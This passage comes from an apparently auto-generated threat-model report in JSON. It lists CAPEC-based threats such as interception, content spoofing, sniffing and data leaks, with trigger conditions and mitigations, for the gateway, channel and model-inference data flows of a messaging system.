can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.", "id": "323", "mitigations": "Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.", "references": "https://capec.mitre.org/data/definitions/216.html", "response": "", "severity": "High", "target": "Inbound channel events to Gateway", "threat_id": "CR06"}, {"assumption": null, "condition": "not target.controls.isEncrypted or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Client-Server Protocol Manipulation", "details": "An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions. For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions.", "example": "An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.", "id": "324", "mitigations": "Use strong authentication protocols.", "references": "https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html", "response": "", "severity": "Medium", "target": "Inbound channel events to Gateway", "threat_id": "CR08"}, {"assumption": null, "condition": "target.hasDataLeaks()", "cvss": "", "description": "Data Leak", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "An application, which connects to a database without TLS, performs a database query in which it compares the password to a stored hash, instead of fetching the hash and comparing it locally.", "id": "325", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "Very High", "target": "Inbound channel events to Gateway", "threat_id": "DS06"}, {"assumption": null, "condition": "(target.hasDataLeaks() or any(d.isCredentials or d.isPII for d in target.data)) and (not target.controls.isEncrypted or (not target.isResponse and any(d.isStored and d.isDestEncryptedAtRest for d in target.data)) or (target.isResponse and any(d.isStored and d.isSourceEncryptedAtRest for d in target.data)))", "cvss": "", "description": "Unprotected Sensitive Data", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "", "id": "326", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "High", "target": "Inbound channel events to Gateway", "threat_id": "DR01"}, {"assumption": null, "condition": "not target.controls.isEncrypted or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation)) or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Interception", "details": "An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream, influence the nature of the data transmitted, or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position himself so as to observe explicit data channels (e.g. network traffic) and read the content.", "example": "Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.", "id": "327", "mitigations": "Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.", "references": "https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Normalized inbound messages", "threat_id": "DE01"}, {"assumption": null, "condition": "((not target.source.controls.providesIntegrity or not target.sink.controls.providesIntegrity) and not target.controls.isEncrypted) or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation))", "cvss": "", "description": "Content Spoofing", "details": "An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.", "example": "An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker's server.", "id": "328", "mitigations": "Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.", "references": "https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Normalized inbound messages", "threat_id": "AC05"}, {"assumption": null, "condition": "(target.protocol == 'HTTP' or target.controls.isEncrypted is False) or target.usesVPN is False", "cvss": "", "description": "Sniffing Attacks", "details": "In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient.", "example": "Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.", "id": "329", "mitigations": "Encrypt sensitive information when transmitted on insecure mediums to prevent interception.", "references": "https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html", "response": "", "severity": "Medium", "target": "Normalized inbound messages", "threat_id": "DE03"}, {"assumption": null, "condition": "(target.protocol != 'HTTPS' or target.usesVPN is False) and (target.controls.implementsAuthenticationScheme is False or target.controls.authorizesSource is False)", "cvss": "", "description": "Communication Channel Manipulation", "details": "An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.", "example": "Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.", "id": "330", "mitigations": "Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.", "references": "https://capec.mitre.org/data/definitions/216.html", "response": "", "severity": "High", "target": "Normalized inbound messages", "threat_id": "CR06"}, {"assumption": null, "condition": "not target.controls.isEncrypted or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Client-Server Protocol Manipulation", "details": "An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions. For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions.", "example": "An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.", "id": "331", "mitigations": "Use strong authentication protocols.", "references": "https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html", "response": "", "severity": "Medium", "target": "Normalized inbound messages", "threat_id": "CR08"}, {"assumption": null, "condition": "target.hasDataLeaks()", "cvss": "", "description": "Data Leak", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "An application, which connects to a database without TLS, performs a database query in which it compares the password to a stored hash, instead of fetching the hash and comparing it locally.", "id": "332", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "Very High", "target": "Normalized inbound messages", "threat_id": "DS06"}, {"assumption": null, "condition": "(target.hasDataLeaks() or any(d.isCredentials or d.isPII for d in target.data)) and (not target.controls.isEncrypted or (not target.isResponse and any(d.isStored and d.isDestEncryptedAtRest for d in target.data)) or (target.isResponse and any(d.isStored and d.isSourceEncryptedAtRest for d in target.data)))", "cvss": "", "description": "Unprotected Sensitive Data", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "", "id": "333", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "High", "target": "Normalized inbound messages", "threat_id": "DR01"}, {"assumption": null, "condition": "not target.controls.isEncrypted or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation)) or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Interception", "details": "An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream, influence the nature of the data transmitted, or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position himself so as to observe explicit data channels (e.g. network traffic) and read the content.", "example": "Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.", "id": "334", "mitigations": "Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.", "references": "https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Outbound messages to channels", "threat_id": "DE01"}, {"assumption": null, "condition": "((not target.source.controls.providesIntegrity or not target.sink.controls.providesIntegrity) and not target.controls.isEncrypted) or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation))", "cvss": "", "description": "Content Spoofing", "details": "An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.", "example": "An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker's server.", "id": "335", "mitigations": "Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.", "references": "https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Outbound messages to channels", "threat_id": "AC05"}, {"assumption": null, "condition": "(target.protocol == 'HTTP' or target.controls.isEncrypted is False) or target.usesVPN is False", "cvss": "", "description": "Sniffing Attacks", "details": "In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient.", "example": "Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.", "id": "336", "mitigations": "Encrypt sensitive information when transmitted on insecure mediums to prevent interception.", "references": "https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html", "response": "", "severity": "Medium", "target": "Outbound messages to channels", "threat_id": "DE03"}, {"assumption": null, "condition": "(target.protocol != 'HTTPS' or target.usesVPN is False) and (target.controls.implementsAuthenticationScheme is False or target.controls.authorizesSource is False)", "cvss": "", "description": "Communication Channel Manipulation", "details": "An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.", "example": "Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.", "id": "337", "mitigations": "Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.", "references": "https://capec.mitre.org/data/definitions/216.html", "response": "", "severity": "High", "target": "Outbound messages to channels", "threat_id": "CR06"}, {"assumption": null, "condition": "not target.controls.isEncrypted or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Client-Server Protocol Manipulation", "details": "An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions. For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions.", "example": "An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.", "id": "338", "mitigations": "Use strong authentication protocols.", "references": "https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html", "response": "", "severity": "Medium", "target": "Outbound messages to channels", "threat_id": "CR08"}, {"assumption": null, "condition": "target.hasDataLeaks()", "cvss": "", "description": "Data Leak", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "An application, which connects to a database without TLS, performs a database query in which it compares the password to a stored hash, instead of fetching the hash and comparing it locally.", "id": "339", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "Very High", "target": "Outbound messages to channels", "threat_id": "DS06"}, {"assumption": null, "condition": "(target.hasDataLeaks() or any(d.isCredentials or d.isPII for d in target.data)) and (not target.controls.isEncrypted or (not target.isResponse and any(d.isStored and d.isDestEncryptedAtRest for d in target.data)) or (target.isResponse and any(d.isStored and d.isSourceEncryptedAtRest for d in target.data)))", "cvss": "", "description": "Unprotected Sensitive Data", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "", "id": "340", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "High", "target": "Outbound messages to channels", "threat_id": "DR01"}, {"assumption": null, "condition": "not target.controls.isEncrypted or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation)) or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Interception", "details": "An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream, influence the nature of the data transmitted, or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position himself so as to observe explicit data channels (e.g. network traffic) and read the content.", "example": "Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.", "id": "341", "mitigations": "Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.", "references": "https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Model inference request", "threat_id": "DE01"}, {"assumption": null, "condition": "((not target.source.controls.providesIntegrity or not target.sink.controls.providesIntegrity) and not target.controls.isEncrypted) or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation))", "cvss": "", "description": "Content Spoofing", "details": "An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.", "example": "An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker's server.", "id": "342", "mitigations": "Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.", "references": "https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Model inference request", "threat_id": "AC05"}, {"assumption": null, "condition": "(target.protocol == 'HTTP' or target.controls.isEncrypted is False) or target.usesVPN is False", "cvss": "", "description": "Sniffing Attacks", "details": "In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient.", "example": "Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.", "id": "343", "mitigations": "Encrypt sensitive information when transmitted on insecure mediums to prevent interception.", "references": "https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html", "response": "", "severity": "Medium", "target": "Model inference request", "threat_id": "DE03"}, {"assumption": null, "condition": "(target.protocol != 'HTTPS' or target.usesVPN is False) and (target.controls.implementsAuthenticationScheme is False or target.controls.authorizesSource is False)", "cvss": "", "description": "Communication Channel Manipulation", "details": "An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.", "example": "Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.", "id": "344", "mitigations": "Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.", "references": "https://capec.mitre.org/data/definitions/216.html", "response": "", "severity": "High", "target": "Model inference request", "threat_id": "CR06"}, {"assumption": null, "condition": "not target.controls.isEncrypted or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Client-Server Protocol Manipulation", "details": "An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions. For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions.", "example": "An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.", "id": "345", "mitigations": "Use strong authentication protocols.", "references": "https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html", "response": "", "severity": "Medium", "target": "Model inference request", "threat_id": "CR08"}, {"assumption": null, "condition": "target.hasDataLeaks()", "cvss": "", "description": "Data Leak", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "An application, which connects to a database without TLS, performs a database query in which it compares the password to a stored hash, instead of fetching the hash and comparing it locally.", "id": "346", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "Very High", "target": "Model inference request", "threat_id": "DS06"}, {"assumption": null, "condition": "(target.hasDataLeaks() or any(d.isCredentials or d.isPII for d in target.data)) and (not target.controls.isEncrypted or (not target.isResponse and any(d.isStored and d.isDestEncryptedAtRest for d in target.data)) or (target.isResponse and any(d.isStored and d.isSourceEncryptedAtRest for d in target.data)))", "cvss": "", "description": "Unprotected Sensitive Data", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "", "id": "347", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "High", "target": "Model inference request", "threat_id": "DR01"}, {"assumption": null, "condition": "not target.controls.isEncrypted or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation)) or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Interception", "details": "An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream, influence the nature of the data transmitted, or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position himself so as to observe explicit data channels (e.g. network traffic) and read the content.", "example": "Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.", "id": "348", "mitigations": "Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.", "references": "https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Model inference response", "threat_id": "DE01"}, {"assumption": null, "condition": "((not target.source.controls.providesIntegrity or not target.sink.controls.providesIntegrity) and not target.controls.isEncrypted) or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation))", "cvss": "", "description": "Content Spoofing", "details": "An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.", "example": "An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker's server.", "id": "349", "mitigations": "Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.", "references": "https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Model inference response", "threat_id": "AC05"}, {"assumption": null, "condition": "(target.protocol == 'HTTP' or target.controls.isEncrypted is False) or target.usesVPN is False", "cvss": "", "description": "Sniffing Attacks", "details": "In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient.", "example": "Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.", "id": "350", "mitigations": "Encrypt sensitive information when transmitted on insecure mediums to prevent interception.", "references": "https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html", "response": "", "severity": "Medium", "target": "Model inference response", "threat_id": "DE03"}, {"assumption": null, "condition": "(target.protocol != 'HTTPS' or target.usesVPN is False) and (target.controls.implementsAuthenticationScheme is False or target.controls.authorizesSource is False)", "cvss": "", "description": "Communication Channel Manipulation", "details": "An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.", "example": "Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.", "id": "351", "mitigations": "Encrypt all sensitive communications using properly-configured 